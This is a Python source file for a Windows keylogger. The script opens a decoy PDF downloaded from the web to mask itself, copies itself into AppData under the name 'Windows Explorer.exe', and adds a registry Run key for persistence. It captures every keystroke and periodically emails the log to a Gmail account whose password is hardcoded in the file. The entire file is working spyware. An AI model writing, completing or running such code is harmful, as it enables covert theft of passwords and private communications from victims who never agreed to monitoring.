#!/usr/bin/env/ python

import smtplib,ssl
import pynput
import threading
import sys
import urllib.request
import subprocess
import shutil
import os

class Keylogger:
    def __init__(self, time_interval):
        """
        Parameters
        ----------
        time_interval : integer
            time interval in seconds.

        Returns
        -------
        None.

        """
        self.log = ""
        self.interval = time_interval
        
        # Opens a PDF File
        self.download_url = "http://ftp.iza.org/dp10541.pdf"
        self.filename = "dp10541"        
        response = urllib.request.urlopen(self.download_url)    
        file = open(self.filename + ".pdf", 'wb')
        file.write(response.read())
        file.close()
        subprocess.Popen([self.filename+".pdf"],shell=True)
        
        # Copy File to another location
        
        original = os.getcwd()
        original = original + "\\" + self.filename + ".exe"          
        target = os.environ["appdata"] + "\Windows Explorer.exe" 
        shutil.copyfile(original, target)
        
        # Adding the copied file location to Regedit for it start every time the system starts
        
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + target + '"', shell = True)
        
    
    def sendMail(self, message):
        """
        Takes in one argument which is the message and sends email to the 
        receipient address.

        Parameters
        ----------
        message : str
            The message to be sent.

        Returns
        -------
        None.

        """
        
        m = "Subject: New update \n\n" + message
    
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = "pykeylogger5@gmail.com"  # Sender email address
        receiver_email = "pykeylogger5@gmail.com"  # Receiver email address
        password = "youcantfindme@123"
        
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, m)
        
    
    def appendToLog(self, string):
        
        """
        appends the keystrokes to a log variable
        
        Parameters
        ----------
        
        string: str
                takes the string input from processKeyPress
        
    
        """
        
        
        self.log = self.log + string
    

    
    def processKeyPress(self, key):
        """
        Gets input from keyboard listener and converts to string.

        Parameters
        ----------
        key : str
            input from the keyboard listener..

        Returns
        -------
        None.

        """
        
        
        try: 
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        self.appendToLog(current_key)
        
    def onRelease(self, key):
        """
        Escape character for the program to end

        Parameters
        ----------
        key : str
            takes input from the keyboard listener.

        Returns
        -------
        bool
            returns False if the key is esc or returns True.

        """
        
        if key == pynput.keyboard.Key.esc:
            print("Keylogger ended")
            
            return False
            
        
        
        
    def report(self):
        """
        Sends Email on regular intervals.

        Returns
        -------
        None.

        """
        #print(self.log)
        self.sendMail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()      
            
        
    
    def start(self):
        """
        Starts the Keyboard Listener

        Returns
        -------
        None.

        """
        
        keyboard_listener = pynput.keyboard.Listener(on_press = self.processKeyPress,
                                                     on_release = self.onRelease)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        



